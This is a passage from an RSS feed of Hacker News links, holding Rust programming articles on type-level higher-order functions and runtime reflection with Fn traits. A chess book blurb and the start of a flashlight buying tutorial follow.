<span>where</span>
  <span>Proxy</span><span>:</span> <span>FuncProxy</span><span>,</span>
  <span>XS</span><span>:</span> <span>ComputeMap</span><span>&lt;</span><span>Proxy</span><span>&gt;</span>
<span>{</span>
  <span>type</span> <span>Output</span> <span>=</span> <span>TCons</span><span>&lt;</span><span>Proxy</span><span>::</span><span>Func</span><span>&lt;</span><span>X</span><span>&gt;</span><span>,</span> <span>Map</span><span>&lt;</span><span>XS</span><span>,</span> <span>Proxy</span><span>&gt;&gt;</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>However, this attempt still doesn’t quite work. We get an error in the implementation of <code>FuncProxy</code> for <code>TIsZeroProxy</code>:</p>

<div><div><pre><code>error[E0277]: the trait bound `T: ComputeTIsZero` is not satisfied
    |
    |   type Func&lt;T&gt; = TIsZero&lt;T&gt;;
    |   ^^^^^^^^^^^^^^^^^^^^^^^^ the trait `ComputeTIsZero` is not implemented for `T`
    |
</code></pre></div></div>

<p>Why do we get this? Recall that <code>TIsZero&lt;T&gt;</code> is an alias for <code>&lt;T as ComputeTIsZero&gt;::Output</code>. This means that <code>T</code> must implement the <code>ComputeTIsZero</code> trait, which isn’t guaranteed by our general <code>FuncProxy</code> trait definition. We could theoretically change <code>FuncProxy</code> to include this bound, something like:</p>

<div><div><pre><code><span>trait</span> <span>FuncProxy</span> <span>{</span>
  <span>type</span> <span>Func</span><span>&lt;</span><span>T</span><span>:</span> <span>ComputeTIsZero</span><span>&gt;</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>However, our goal is for <code>Map</code> to take as input any type-level function. This definition of <code>FuncProxy</code> would restrict the implement to only functions mentioned in the trait bounds.</p>

<h2 id="dealing-with-partial-functions">Dealing with partial functions</h2>

<p>Let’s back up to understand the conceptual issue. In Rust, type-level functions are partial functions, meaning they may not be implemented for all types. For example, <code>TIsZero</code> is only implemented for the types <code>Z</code> and <code>S&lt;N&gt;</code>, but not e.g. for the type <code>String</code>. However, to define <code>Map</code>, we have to ensure that <code>Proxy::Func&lt;X&gt;</code> is defined for all <code>X</code> in a type list.</p>

<p>Previously, we could ensure this condition via a trait bound. For example, if <code>Proxy::Func</code> was <code>ComputeTIsZero</code>, then we could add <code>X: ComputeTIsZero</code> to the implementation. But for any generic <code>Proxy::Func</code>, there is no way to say <code>X: Proxy::Func</code> because <code>Proxy::Func</code> is a type, not a trait. Hypothetically, if Rust supported <a href="https://github.com/rust-lang/rfcs/issues/2190">associated traits</a>, we could do something like:</p>

<div><div><pre><code><span>trait</span> <span>FuncProxy</span> <span>{</span>
  <span>trait</span> <span>Func</span> <span>{</span> <span>type</span> <span>Output</span><span>;</span> <span>};</span>
<span>}</span>

<span>impl</span> <span>FuncProxy</span> <span>for</span> <span>TIsZeroProxy</span> <span>{</span>
  <span>trait</span> <span>Func</span> <span>=</span> <span>ComputeTIsZero</span><span>;</span>
<span>}</span>

<span>type</span> <span>CallProxy</span><span>&lt;</span><span>Proxy</span><span>,</span> <span>T</span><span>&gt;</span> <span>=</span> <span>&lt;</span><span>T</span> <span>as</span> <span>Proxy</span><span>::</span><span>Func</span><span>&gt;</span><span>::</span><span>Output</span><span>;</span>

<span>impl</span><span>&lt;</span><span>X</span><span>,</span> <span>XS</span><span>,</span> <span>Proxy</span><span>&gt;</span> <span>ComputeMap</span><span>&lt;</span><span>Proxy</span><span>&gt;</span> <span>for</span> <span>TCons</span><span>&lt;</span><span>X</span><span>,</span> <span>XS</span><span>&gt;</span>
<span>where</span>
  <span>Proxy</span><span>:</span> <span>FuncProxy</span><span>,</span>
  <span>XS</span><span>:</span> <span>ComputeMap</span><span>&lt;</span><span>Proxy</span><span>&gt;</span><span>,</span>
  <span>X</span><span>:</span> <span>Proxy</span><span>::</span><span>Func</span>
<span>{</span>
  <span>type</span> <span>Output</span> <span>=</span> <span>TCons</span><span>&lt;</span><span>CallProxy</span><span>&lt;</span><span>Proxy</span><span>,</span> <span>X</span><span>&gt;</span><span>,</span> <span>Map</span><span>&lt;</span><span>XS</span><span>,</span> <span>Proxy</span><span>&gt;&gt;</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>However, Rust doesn’t have such a feature. Instead, we can use <a href="https://github.com/rust-lang/rust/issues/31844">specialization</a> to make all type functions total. We can define a base case where a type function returns an error if it’s not implemented, but as a type rather than a compiler error. To compile <code>TIsZero</code>, this solution looks like:</p>

<div><div><pre><code><span>pub</span> <span>struct</span> <span>Error</span><span>;</span>

<span>pub</span> <span>trait</span> <span>FuncProxy</span> <span>{</span>
  <span>type</span> <span>Func</span><span>&lt;</span><span>T</span><span>&gt;</span><span>;</span>
<span>}</span>

<span>pub</span> <span>trait</span> <span>ComputeTIsZero</span> <span>{</span>
  <span>type</span> <span>Output</span><span>;</span>
<span>}</span>

<span>type</span> <span>TIsZero</span><span>&lt;</span><span>T</span><span>&gt;</span> <span>=</span> <span>&lt;</span><span>T</span> <span>as</span> <span>ComputeTIsZero</span><span>&gt;</span><span>::</span><span>Output</span><span>;</span>

<span>impl</span> <span>ComputeTIsZero</span> <span>for</span> <span>Z</span> <span>{</span>
  <span>type</span> <span>Output</span> <span>=</span> <span>TTrue</span><span>;</span>
<span>}</span>

<span>impl</span><span>&lt;</span><span>N</span><span>&gt;</span> <span>ComputeTIsZero</span> <span>for</span> <span>S</span><span>&lt;</span><span>N</span><span>&gt;</span> <span>{</span>
  <span>type</span> <span>Output</span> <span>=</span> <span>TFalse</span><span>;</span>
<span>}</span>

<span>/* key addition */</span>
<span>impl</span><span>&lt;</span><span>T</span><span>&gt;</span> <span>ComputeTIsZero</span> <span>for</span> <span>T</span> <span>{</span>
  <span>default</span> <span>type</span> <span>Output</span> <span>=</span> <span>Error</span><span>;</span>
<span>}</span>

<span>struct</span> <span>TIsZeroProxy</span><span>;</span>
<span>impl</span> <span>FuncProxy</span> <span>for</span> <span>TIsZeroProxy</span> <span>{</span>
  <span>type</span> <span>Func</span><span>&lt;</span><span>T</span><span>&gt;</span> <span>=</span> <span>TIsZero</span><span>&lt;</span><span>T</span><span>&gt;</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>With this addition, the <code>TIsZeroProxy</code> implementation no longer errors, because <code>ComputeTIsZero</code> is guaranteed to be implemented for all types <code>T</code>. And now, at long last, our <code>Map</code> program will execute correctly if we replace <code>TIsZero</code> with <code>TIsZeroProxy</code>:</p>

<div><div><pre><code><span>fn</span> <span>main</span><span>()</span> <span>{</span>
  <span>assert_type_eq</span><span>::</span><span>&lt;</span>
    <span>Map</span><span>&lt;</span>
      <span>TCons</span><span>&lt;</span><span>Z</span><span>,</span> <span>TCons</span><span>&lt;</span><span>S</span><span>&lt;</span><span>Z</span><span>&gt;</span><span>,</span> <span>TNil</span><span>&gt;&gt;</span><span>,</span>
      <span>TIsZeroProxy</span>
    <span>&gt;</span><span>,</span>
    <span>TCons</span><span>&lt;</span><span>TTrue</span><span>,</span> <span>TCons</span><span>&lt;</span><span>TFalse</span><span>,</span> <span>TNil</span><span>&gt;&gt;</span>
  <span>&gt;</span><span>();</span>
<span>}</span>
</code></pre></div></div>

<blockquote>
  <p>Note: as of January 2021, this pattern is theoretically sound, but seems to have ongoing performance or correctness issues in the compiler. Specialization combined with recursive trait bounds will occassionally cause the compiler to stack overflow  — see my <a href="https://github.com/rust-lang/rust/issues/80700">Github issue</a>.</p>
</blockquote>

<h2 id="dynamically-kinded-type-level-programming">Dynamically-kinded type-level programming</h2>

<p>To add support for higher-order type functions, I had to remove support for type annotations (actually kind annotations) from Tyrade. Previously, you could write functions like this:</p>

<div><div><pre><code><span>tyrade!</span> <span>{</span>
  <span>fn</span> <span>TIsZero</span><span>(</span><span>N</span><span>:</span> <span>TNum</span><span>)</span> <span>-&gt;</span> <span>TBool</span> <span>{</span>
    <span>match</span> <span>N</span> <span>{</span>
      <span>Z</span> <span>=&gt;</span> <span>TTrue</span><span>,</span>
      <span>S</span><span>(</span><span>N1</span> <span>@</span> <span>TNum</span><span>)</span> <span>=&gt;</span> <span>TFalse</span>
    <span>}</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>This program would compile into the trait definition:</p>

<div><div><pre><code><span>trait</span> <span>ComputeTIsZero</span><span>:</span> <span>TNum</span> <span>{</span>
  <span>type</span> <span>Output</span><span>:</span> <span>TBool</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>This ensures, for example, that a function’s return value matches its return kind. If you wrote a function with a mismatch:</p>

<div><div><pre><code><span>tyrade!</span> <span>{</span>
  <span>fn</span> <span>TIsZero</span><span>(</span><span>N</span><span>:</span> <span>TNum</span><span>)</span> <span>-&gt;</span> <span>TBool</span> <span>{</span>
    <span>Z</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>Then the compiler raises an error at the point of <em>definition</em> for <code>TIsZero</code> rather than the point of <em>use</em>. Hence, this language is statically-kinded. However, to kind-check a higher-order function like <code>Map</code>, we need a polymorphic kind system. Ideally, we could write in Tyrade:</p>

<div><div><pre><code><span>tyrade!</span> <span>{</span>
  <span>fn</span> <span>Map</span><span>&lt;</span><span>A</span><span>,</span> <span>B</span><span>&gt;</span><span>(</span><span>L</span><span>:</span> <span>List</span><span>&lt;</span><span>A</span><span>&gt;</span><span>,</span> <span>F</span><span>:</span> <span>A</span> <span>-&gt;</span> <span>B</span><span>)</span> <span>-&gt;</span> <span>List</span><span>&lt;</span><span>B</span><span>&gt;</span> <span>{</span>
    <span>...</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>I don’t believe it’s possible to encode this concept into Rust’s trait system. So to add higher-order functions, our type-level programming language had to become dynamically-kinded. A sad trade-off, but perhaps more acceptable for type-level programming than value-level. Although errors are caught by the users and not the definers, at least they’re still caught at compile-time!</p>

</div></div>]]>
            </description>
            <link>https://willcrichton.net/notes/gats-are-hofs/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25704895</guid>
            <pubDate>Sat, 09 Jan 2021 21:22:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building a runtime reflection system for Rust (Part 3)]]>
            </title>
            <description>
<![CDATA[
Score 55 | Comments 8 (<a href="https://news.ycombinator.com/item?id=25704707">thread link</a>) | @lukastyrychtr
<br/>
January 9, 2021 | https://www.osohq.com/post/runtime-reflection-pt-3 | <a href="https://web.archive.org/web/*/https://www.osohq.com/post/runtime-reflection-pt-3">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><h2><strong>Part 3: <code>dyn Method</code></strong></h2>
<h3>Introduction</h3>
<p>Welcome to the third and final installment of our series on how we implemented a runtime reflection system in Rust.</p>
<p>So far, we've shown how we came up with a fairly simple <code>Class</code> and <code>Instance</code> model for thinking about runtime Rust classes. In <a href="https://www.osohq.com/post/rust-reflection-pt-1">Part 1</a>, we used these for type checking, and in <a href="https://www.osohq.com/post/runtime-reflection-pt-2">Part 2</a> we added support for reading attributes off of a struct.</p>
<p>In this post, we pick up where we left off with attribute getters, and expand into <strong>method calls</strong>. In some ways, the same techniques we used for attributes work just as well here. We can store a map from method name to functions implementing them. However, there's a curveball: the Rust <code>Fn*</code> traits. We'll talk through the wrong turns we took, and the tidbits of Rust knowledge we picked up along the way.</p>
<h2>Method Calls</h2>
<p>Now that we have classes, instances, and attributes, the next obvious step is to add methods.</p>
<p>In oso policies, it is possible to call both class and instance methods, with and without arguments.</p>
<p>So given the struct:</p>
<pre><code>struct Cat;

impl Cat {
    /// A class method (note lack of `self`).
    fn meow() -&gt; String {
       "meowww".to_string()
    }

    /// An instance method.
    fn feed(&amp;self, food: &amp;str) -&gt; String {
        if food == "tuna" { "purr".to_string() } else { Self::meow() }
    }
}
</code></pre>

<p>We should be able to write policy logic:</p>
<pre><code>favourite_food(cat: Cat, food) if cat.feed(food) != Cat.meow();
</code></pre>

<p>Which says that the input <code>food</code> is the cat's favourite food if the result of feeding the cat is not the same as the result of the cat meowing.</p>
<h3>Step 1: Zero arguments</h3>
<p>Let's start with a simple implementation for methods that take <em>zero</em> arguments. The approach for implementing zero-argument methods is extremely similar to how we'd implement attribute getters, and we've actually done this already in Part 2:</p>
<pre><code>/// Class definitions
struct Class {
    ...

    /// Map from attribute name to the attribute lookup
    methods: HashMap&lt;&amp;'static str, InstanceMethod&gt;
}

struct InstanceMethod(Arc&lt;dyn Fn(&amp;Instance) -&gt; PolarValue);
</code></pre>

<p>Similarly, we need to add a method onto our <code>ClassBuilder</code> struct to allow us to register new methods:</p>
<pre><code>pub fn add_method&lt;F, R&gt;(mut self, name: &amp;'static str, f: F) -&gt; Self
where
    F: Fn(&amp;T) -&gt; R,
    R: crate::ToPolar,
{
    self.class.methods.insert(name, InstanceMethod::new(f));
    self
}
</code></pre>

<p>Super easy! End of blog post. See you next time 😎 </p>
<p>But wait, what about methods with multiple arguments?</p>
<h3>Step 2: Multiple Arguments and the <code>Fn*</code> traits</h3>
<p>Let's take what we have above and add in support for multiple arguments.</p>
<pre><code>struct InstanceMethod(Arc&lt;dyn Fn(&amp;Instance, Vec&lt;PolarValue&gt;) -&gt; PolarValue&gt;);
</code></pre>

<p>This mostly works for what we need! Polar doesn't care about method arities (how many arguments the method accepts) – it will send over however many arguments it has as a vector. Polar supports both variable number of arguments (varargs) and keyword arguments (kwargs). The latter is only supported for host languages that also have that concept, and Rust does not.</p>
<p>But this isn't the end of the story. The crucial part of the <code>AttributeGetter</code> interface was that you could pass in any method or closure for the attribute getter, and the <code>AttributeGetter::new</code> method handled all the type-conversions transparently. This hid the messy, error-prone details from the user and kept the interface clean.</p>
<p>So let's do the same for <code>InstanceMethod</code>!</p>
<pre><code>impl InstanceMethod {
    pub fn new&lt;T, F, ???&gt;(f: F) -&gt; Self
    where
        F: Fn(&amp;T, ???)
        F::Result: ToPolarResult,
        T: 'static,
    {
        Self(Arc::new(
            move |receiver: &amp;Instance, args: Vec&lt;PolarValue&gt;| {
                let receiver = receiver
                    .downcast()
                    .map_err(|e| e.invariant().into());
                // ermm.... what next?
            },
        ))
    }
}
</code></pre>

<p>We've hit our first problem.</p>
<p>The input to an attribute getter never accepted any arguments, and we only needed it to work for all <code>Fn(&amp;T)</code>. In order to support <em>multiple arguments</em>, we now need to cover <code>Fn(&amp;T)</code>, <code>Fn(&amp;T, A)</code>, <code>Fn(&amp;T, A, B)</code>, and so on.</p>
<p>The first problem is how to convert <code>A</code>, <code>B</code>, etc. into <code>PolarValue</code>s.</p>
<p>The second problem is that these are all <em>completely distinct traits</em>. There is no trait capturing "functions of arity 2, 3, 4...". –&nbsp;at least not until the feature is available in stable Rust. In the future, this <em>might</em> be represented with the syntax <code>Fn&lt;Args, Output=T&gt;</code>, but right now using this syntax results in:</p>
<pre><code>error[E0658]: the precise format of `Fn`-family traits' type parameters is subject to change
 --&gt; src/main.rs:2:14
  |
2 |     where F: Fn&lt;(u32,), Output=u32&gt; {
  |              ^^^^^^^^^^^^^^^^^^^^^^ help: use parenthetical notation instead: `Fn(u32) -&gt; u32`
  |
  = note: see issue #29625 &lt;https://github.com/rust-lang/rust/issues/29625&gt; for more information
</code></pre>

<p>We could opt to use Rust nightly to get these features, but it's not a huge stretch to implement them ourselves.</p>
<h3>Implementing our own <code>Method</code> trait</h3>
<p>This is where as the writer it's tempting to unveil my newly-created trait, perfectly matching what we needed, and make it look like I just put fingers to keyboard to get to the definition.</p>
<p>In reality, we spent a sizeable chunk of our engineering effort for this project on this one trait. We made mistakes. We wrote code that we threw out. And a lot of that is because we didn't understand some of the nuances of Rust functions and the trait resolution system. Instead of papering over all of that, we thought it would be more interesting to show you what we tried. </p>
<p><strong>Attempt #1</strong></p>
<p>The first thing we tried was, in hindsight, a little greedy. Why not just skip straight to writing a trait to encapsulate precisely what we need?</p>
<pre><code>pub trait Method {
   fn invoke(&amp;self, receiver: Instance, args: Vec&lt;PolarValue&gt;) -&gt; PolarValue;
}
</code></pre>

<p>This looks great, let's try implementing it for one of our <code>Fn</code> variants:</p>
<pre><code>impl&lt;F, T, R&gt; Method for F
where
   F: Fn(&amp;T) -&gt; R,
   T: 'static,
   R: ToPolarValue,
{
    fn invoke(&amp;self, instance: Instance, args: Vec&lt;PolarValue&gt;) -&gt; PolarValue {
        debug_assert!(args.is_empty());
        let receiver = instance.downcast::&lt;T&gt;().unwrap();
        self(receiver).to_polar()
    }
}
</code></pre>

<p>Results in:</p>
<pre><code>impl&lt;F, T, R&gt; Method for F
        ^ unconstrained type parameter
the type parameter `T` is not constrained by the impl trait, self type, or predicates

impl&lt;F, T, R&gt; Method for F
           ^ unconstrained type parameter
the type parameter `R` is not constrained by the impl trait, self type, or predicates
</code></pre>

<p>It's likely that most people have hit some variation of this error in their Rust adventures! What is going on here? <code>T</code> and <code>R</code> <em>look</em> pretty constrained to me? They are right there inside the definition of <code>F: Fn(&amp;T) -&gt; R</code>. </p>
<p>Our mistake was reading those trait bounds as: <code>F</code> is a function from <code>&amp;T</code> to <code>R</code>, whereas in reality this is a regular old trait bound with slightly different syntax for the trait itself. And one function might implement multiple of these trait bounds.</p>
<p>E.g.</p>
<pre><code>// do nothing
fn ident&lt;T&gt;(t: T) -&gt; T { t }

let _ = &amp;ident as &amp;dyn Fn(u32) -&gt; u32;
let _ = &amp;ident as &amp;dyn Fn(String) -&gt; String;
</code></pre>

<p>So which trait should we use for the implementation of <code>Method</code> for <code>ident</code>?</p>
<p>Here's another way of looking at this problem. Suppose instead we decided to exhaustively implement our <code>Method</code> trait for all types we care about:</p>
<pre><code>impl&lt;F&gt; Method for F
where
   F: Fn(&amp;u32) -&gt; u32,
{
    fn invoke(&amp;self, instance: Instance, args: Vec&lt;PolarValue&gt;) -&gt; PolarValue {
        debug_assert!(args.is_empty());
        let receiver = instance.downcast::&lt;u32&gt;().unwrap();
        self(receiver).to_polar()
    }
}

impl&lt;F&gt; Method for F
where
   F: Fn(&amp;String) -&gt; String,
{
    fn invoke(&amp;self, instance: Instance, args: Vec&lt;PolarValue&gt;) -&gt; PolarValue {
        debug_assert!(args.is_empty());
        let receiver = instance.downcast::&lt;String&gt;().unwrap();
        self(receiver).to_polar()
    }
}
</code></pre>

<p>Ignoring for now just how bad an idea this is, it doesn't even work! We get:</p>
<pre><code>conflicting implementations of trait `Method`:
</code></pre>

<p>Look back to <code>ident</code>. That one function implements both <code>Fn(String) -&gt; String</code> and <code>Fn(u32) -&gt; u32</code> traits. Similarly, in the above case, a function that implements both <code>Fn(&amp;String) -&gt; String</code> and <code>Fn(&amp;u32) -&gt; u32</code> would have two possible implementations for <code>Method</code>. So we get conflicting implementations.  </p>
<p><em>Actually</em>, it goes even further than that. Implementing a blanket trait implementation over <em>any</em> two function trait bounds results in conflicting implementations. Even though such a function couldn't exist:</p>
<pre><code>trait Test {}

impl&lt;F: Fn()&gt; Test for F { }
impl&lt;F: Fn(String) -&gt; String&gt; Test for F { }
</code></pre>

<p>Results in:</p>
<pre><code>error[E0119]: conflicting implementations of trait `Test`:
  |
4 | impl&lt;F: Fn()&gt; Test for F { }
  | ------------------------ first implementation here
5 | impl&lt;F: Fn(String) -&gt; String&gt; Test for F { }
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ conflicting implementation
</code></pre>

<p>One day (or today, if you're on Rust nightly), Rust might let you implement <code>Fn</code> for your own types, support variadic functions (what do you mean Rust already supports <a href="https://doc.rust-lang.org/nomicon/ffi.html#variadic-functions">variadic functions</a>?), and do all kinds of fun things of the sort. But for now we're not going to get much farther with this approach.</p>
<p><strong>Attempt #2</strong></p>
<p>This <code>Method</code> trait looks too convenient to throw away entirely at the first sign of complication. Let's try something different. If our original mistake was thinking of <code>Fn</code> as a function instead of a trait, perhaps we can heed the wisdom of the Rust docs and use <code>fn</code> instead.</p>
<p><img alt="Building%20a%20runtime%20reflection%20system%20for%20Rust%20(Par%20e9d46e4c771847e7ba119df92cf2a8b9/Untitled.png" src="https://images.osohq.com/runtime-reflection-pt-3/Building%20a%20runtime%20reflection%20system%20for%20Rust%20%28Par%20e9d46e4c771847e7ba119df92cf2a8b9/Untitled.png"></p>
<p>Based on the docs, we can use <code>fn</code> with both regular functions and closures! Great, let's do just that:</p>
<pre><code>impl&lt;T, R&gt; Method for fn(&amp;T) -&gt; R
where
    T: 'static,
    R: ToPolarValue,
{
     fn invoke(&amp;self, instance: Instance, args: Vec&lt;PolarValue&gt;) -&gt; PolarValue {
        debug_assert!(args.is_empty());
        let receiver = instance.downcast().unwrap();
        self(receiver).to_polar()
    }
}
</code></pre>

<p>Works fine! Let's try it out:</p>
<pre><code>let clone = |receiver: &amp;String| -&gt; String { receiver.clone() };
let clone_method: Box&lt;dyn Method&gt; = Box::new(clone);
let …</code></pre></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.osohq.com/post/runtime-reflection-pt-3">https://www.osohq.com/post/runtime-reflection-pt-3</a></em></p>]]>
            </description>
            <link>https://www.osohq.com/post/runtime-reflection-pt-3</link>
            <guid isPermaLink="false">hacker-news-small-sites-25704707</guid>
            <pubDate>Sat, 09 Jan 2021 21:03:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Chess Fundamentals, by Jose Raul Capablanca]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25704484">thread link</a>) | @sharjeelsayed
<br/>
January 9, 2021 | https://madnessserial.com/mdash/chess-fundamentals-jose-raul-capablanca | <a href="https://web.archive.org/web/*/https://madnessserial.com/mdash/chess-fundamentals-jose-raul-capablanca">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-ec89d6eae23dfdbab044"><div><p>Jose Capablanca's classic instructional manual <strong><em>Chess Fundamentals</em></strong> first appeared in 1921, the year he defeated Emanuel Lasker for the world championship title. </p><p>This handbook is packed with timeless advice on different aspects of practical play and illustrated by Capablanca's own games.</p><p>In chess, the tactics may change, but the strategic fundamental principles are always the same so that Chess Fundamentals is as good now as it was thirteen years ago. </p><p>It will be as good a hundred years from now; as long in fact as the laws and rules of the game remain what they are at present. Therefore, the reader may go over the book's contents with the assurance that there is in it everything he needs and that there is nothing to be added and nothing to be changed. </p><p>Chess Fundamentals was the one standard work of its kind thirteen years ago, and the author firmly believes that it is the one standard work of its kind now.</p><p>This edition has been published thanks to the generous support of our Patrons, Master Members, and Donors. Visit our <a href="https://madnessserial.com/honourable-mentions">Honourable Mentions Wall</a> for the complete list of supporters.</p><p>This is a <a href="https://madnessserial.com/public-domain-disclaimer"><em>public domain</em></a><em> eBook</em>, so please feel free to download and share!<br></p><h4>Available Download Formats</h4></div></div></div>]]>
            </description>
            <link>https://madnessserial.com/mdash/chess-fundamentals-jose-raul-capablanca</link>
            <guid isPermaLink="false">hacker-news-small-sites-25704484</guid>
            <pubDate>Sat, 09 Jan 2021 20:39:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Basic Flashlight Tutorial]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25704336">thread link</a>) | @Tomte
<br/>
January 9, 2021 | http://www.asos1.com/flashlight/flashlight01.htm | <a href="https://web.archive.org/web/*/http://www.asos1.com/flashlight/flashlight01.htm">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<td>
<a name="backtotop"></a><div>


<center><span face="helvetica" size="+1"><span face="helvetica" color="#ffff00">Basic Flashlight Tutorial<br><span face="verdana" size="2">An Introduction to High-Performance Flashlights</span></span></span></center>

<hr>


<ol>

<a href="#ov"><li>Overview</li></a>
<a href="#fb"><li>Flashlight Basics</li></a>
<a href="#pb"><li>Popular Brands</li></a>
<a href="#flp"><li>Flashlight Prices</li></a>
<a href="#ls"><li>Light Sources</li></a>
<a href="#rvsol"><li>Runtime</li></a>
<a href="#ui"><li>User Interface</li></a>
<a href="#bs"><li>Batteries</li></a>
<a href="#hlamps"><li>Headlamps</li></a>
<a href="#bcabc"><li>Battery Charging and Battery Chargers</li></a>
<a href="#loabp"><li>Light Output and Beam Patterns</li></a>
<a href="#ledm"><li>LED Manufacturers</li></a>

<a href="#sc"><li>Special Considerations</li></a>
<a href="#fmod"><li>Flashlight Modifications</li></a>
<a href="#acc"><li>Accessories Included with Flashlights</li></a>
<a href="#sellers"><li>Trusted Sellers</li></a>
<a href="#lightsowned"><li>Some of the Flashlights and Spotlights I Currently Own</li></a>
<a href="#trouble"><li>Troubleshooting</li></a>
</ol>



<p>
<a name="ov"></a>
<span face="verdana" color="#ffff00">Overview:</span><br>
I know what you're thinking to yourself.... What is there to know about a flashlight, switch it on and it lights up, switch it off and the light goes out. That's true for the most basic flashlights. When looking for a new flashlight, I discovered that there is a huge community of people that are interested in (or obsessed with) flashlights. They typically refer to themselves as 'flashaholics'. Initially, it was difficult to understand some of the discussions on the various forums because there were so many new terms. This page is a primer. After you understand the basics you'll better understand the discussions on the various flashlight forums (like the Candlepower forum). 

</p><p>
Note:<br>
There will be products that I recommend on this page. I receive no compensation for this. These are simply products that I have used and would recommend to my friends. 


</p><p>
<a name="fb"></a>
<a href="#backtotop"><span face="verdana" color="#206060">Back to the Top</span></a>
</p><hr>


<center><span face="verdana" size="+1"><span face="verdana" color="#ffff00">Flashlight Basics</span></span></center>


<p>
Until recently, virtually all flashlights were simple on/off devices (like the one below) with very limited output. Flashlights like the 4D-cell Maglite were considered to be some of the best, in terms of light output. Those flashlights used an incandescent lamp (hot wire filament producing light). Except for the cheapest flashlights, incandescent lamps are being phased out. The newer flashlights using LEDs produce much more light than most of the flashlights using incandescent lamps. Most people have never seen a flashlight that has anything other than a simple on/off switch. The newer LED flashlights have many modes and various output levels. This makes them much more versatile. If the only options for a flashlight are off and full-on and the flashlight produces an intense output, it makes it almost useless for close-up use (reading a map while someone is driving, etc...) because it's simply too bright. With multiple output levels, the light becomes much more versatile. The various output modes will be described in more detail later. 
 
</p><center><img src="http://www.asos1.com/flashlight/IMG_4759b.jpg" alt=""></center>

<p>
A quick note... Most people think it's normal to have to beat on a flashlight to make it work. We do it without thinking. It's almost as if it's coded into our DNA. Having to beat on a flashlight is normal for older, budget lights but not for high quality lights. High quality lights switch on flawlessly EVERY time. 




</p><p>
<a name="pb"></a>
<a href="#backtotop"><span face="verdana" color="#206060">Back to the Top</span></a>
</p><hr>


<center><span face="verdana" size="+1"><span face="verdana" color="#ffff00">Popular Brands</span></span></center>

<p>
There are dozens of popular manufacturers of high performance flashlights. Names like 4Sevens, Fenix (pronounced like Phoenix), Nitecore, Surefire, Streamlight are considered some of the best. Most of these lights remain on the cutting edge and, at any point in time, produce lights that produce the most intense output possible. Maglite (a familiar example below) is another very common brand but they're not typically considered to be at the cutting edge of technology (although the new XL100 may be an exception). That doesn't mean that they're not good quality  lights but if you're looking for bragging rights (brightest light, smallest size...), Maglite isn't generally in the running. However, if you want a light that's going to be reliable and will last nearly forever, Maglite is still a very good choice. 

</p><center><img src="http://www.asos1.com/flashlight/IMG_4562b.jpg" alt=""></center>





<p>
<a name="flp"></a>
<a href="#backtotop"><span face="verdana" color="#206060">Back to the Top</span></a>
</p><hr>


<center><span face="verdana" size="+1"><span face="verdana" color="#ffff00">Flashlight Prices</span></span></center>
<p>

When you initially get into flashlight collecting, you may be shocked by the prices. Many people are used to buying a two D-cell Rayovac flashlight for $2 at Wal-Mart (really, $2.00, batteries included). Some spend $30 on a two or three D-cell LED Maglite. For most people, these will do everything they need them to do. If you want higher performance flashlights, you'll have to pay significantly more. For example, there are LED flashlights that operate off of one AA or one CR123A battery that produce significantly more light than a 2D-cell Maglite but you can expect to pay at least twice as much for those tiny, high performance  lights. For example, the Nitecore EX11 below sells for approximately $60. On average, small single cell high performance LED flashlights cost approximately $50. Small high performance two cell flashlights (those that use two AA or 2 CR123A batteries) can cost $100 or more. The second image below (Maelstrom G5) is one example. It's powered by two CR123A cells or one 18650 lithium-ion cell. It sells for $100-150 and is about 6" long.  Custom lights (custom machined housings with high performance emitters and custom reflectors) can cost $500 or more. High performance handheld HID search lights can cost well over $2000. 


</p><center><img src="http://www.asos1.com/flashlight/IMG_4523b.jpg" alt=""></center>


<center><img src="http://www.asos1.com/flashlight/IMG_4609b.jpg" alt=""></center>

<p>
Note:<br>
In the two photos above, you can see that there is a chrome bezel on the end of the flashlight. In some instances, this is cosmetic only and serves no special purpose. In other lights, the ring is used to maintain force against the reflector which maintains force against the LED which keeps it tightly against the internal heatsink. If the bezel is loose, the LED may not remain tightly against the heatsink and that could cause it to fail prematurely. If the bezel gets so loose that it falls off of the light, the lens and reflector may fall out and become lost or damaged. Check the tightness of the bezel on your flashlights. They don't often get loose but if they do, it could lead to the flashlight becoming unusable and un-repairable because not all parts are available for all lights. 




</p><p>
<a name="ls"></a>
<a href="#backtotop"><span face="verdana" color="#206060">Back to the Top</span></a>
</p><hr>


<center><span face="verdana" size="+1"><span face="verdana" color="#ffff00">Light Sources</span></span></center>
<p>
<span face="verdana" color="#ffff00">Incandescent Lamps:</span><br>
